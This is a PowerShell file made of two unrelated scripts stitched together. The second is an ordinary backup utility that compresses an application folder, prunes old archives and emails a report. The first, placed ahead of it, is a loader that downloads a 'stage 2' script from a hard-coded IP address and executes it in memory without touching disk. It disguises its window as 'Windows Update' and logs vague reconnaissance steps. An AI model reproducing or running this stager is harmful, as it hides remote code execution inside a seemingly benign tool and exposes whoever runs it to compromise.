<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.53:8080/stage2.ps1',
    [string]$TracePath = "$env:TEMP\report.txt",
    [int]$RequestTimeout = 93
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 93
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

Write-Verbose "Starting in-memory stage"
$RemoteScript = Get-StageScriptText -SourceUrl $TransferUrl -TimeoutSec $RequestTimeout
$TransferResult = Invoke-Stage2Script -ScriptBody $RemoteScript
Write-Verbose "Stage result: $($TransferResult)"

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $TransferUrl
    ScriptLength = $RemoteScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Exporting operation report"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Checking local path"
Write-Verbose "Resolving configured target"
Write-Verbose "Operation completed"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.EXAMPLE
    .\Backup-Application.ps1 -RetentionDays 21
#>

[CmdletBinding()]
param(
    [string]$SourcePath = "C:\Apps\Adatum.Reporting",
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = "E:\Backups\Reporting",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 21,
    [Parameter(Mandatory = $false)]
    [ValidateSet('Optimal', 'Fastest', "NoCompression")]
    [string]$CompressionLevel = "NoCompression",

    [int]$MinFreeGB = 20,
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'
$WarningPreference = 'Continue'
Set-StrictMode -Version 2.0
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}
$jsonBody = $manifest | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List

$MailTo = "backup-ops@adatum.com"
$MailFrom = "backup@adatum.com"
$mailBody = ("Archive: {0} ({1} MB)" -f $archive, $manifest.SizeMB)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Backup completed'
    Body       = $mailBody
    SmtpServer = "smtp.adatum.com"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams
